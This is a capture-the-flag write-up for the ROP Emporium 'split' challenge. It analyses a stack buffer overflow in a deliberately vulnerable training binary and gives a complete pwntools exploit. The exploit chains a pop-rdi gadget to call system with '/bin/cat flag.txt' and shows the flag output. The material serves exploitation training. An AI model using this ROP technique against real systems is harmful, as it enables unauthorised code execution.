# split

The elements that allowed you to complete ret2win are still present, they've just been split apart.
Find them and recombine them using a short ROP chain.

## Writeup

We can check if the binary is stripped or not:

```
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
```

The binary is not stripped we can see function names.

Now check which checks are enabled in this binary:

```
[*] '/home/kali/ROP Emporium/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The stack is not executable, so we can't inject a shellcode.

The program in the **main** function call the function **pwnme**:

```c
void pwnme(void)
{
  undefined buffer [32];
  
  memset(buffer,0,32);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0,buffer,96);
  puts("Thank you!");
  return;
}
```

This function insert **96 bytes** of user input into **32 bytes** of buffer.

The binary also has a function called **usefulFunction**:

```c
void usefulFunction(void)
{
  system("/bin/ls");
  return;
}
```

The function launch the command **/bin/ls**, but we want to show the flag, so we need to insert another argument of the system function.

If we use the command **strings** in to the binary and grep for **/bin**, we can see that the binary contains the string '**/bin/cat flag.txt**':

```bash
strings split | grep /bin
```

With this output:

```
/bin/ls
/bin/cat flag.txt
```

So we can take the address of **system** inside the binary and the address of the string '**/bin/cat flag.txt**' and build the payload:

```python
buffer_dim = 32
offset = buffer_dim + 8

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
cat_flag_addr = next(exe.search(b'/bin/cat flag.txt'))
pop_rdi_addr = rop.find_gadget(['pop rdi'])[0]
system_addr = exe.symbols['system']

payload = [
    b'a' * offset,
    p64(ret),
    p64(pop_rdi_addr),
    p64(cat_flag_addr),
    p64(system_addr)
]
```

We put the address of the string '**/bin/cat flag.txt**' into the register **rdi** that is the register where functions take the first argument, by using the **pop rdi gadget**.

The final exploit will be:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template split
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'split')

context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

buffer_dim = 32
offset = buffer_dim + 8

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
cat_flag_addr = next(exe.search(b'/bin/cat flag.txt'))
pop_rdi_addr = rop.find_gadget(['pop rdi'])[0]
system_addr = exe.symbols['system']

payload = [
    b'a' * offset,
    p64(ret),
    p64(pop_rdi_addr),
    p64(cat_flag_addr),
    p64(system_addr)
]

payload = b''.join(payload)

io.sendlineafter(b'> ', payload)

io.interactive()
```

The output will be:

```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```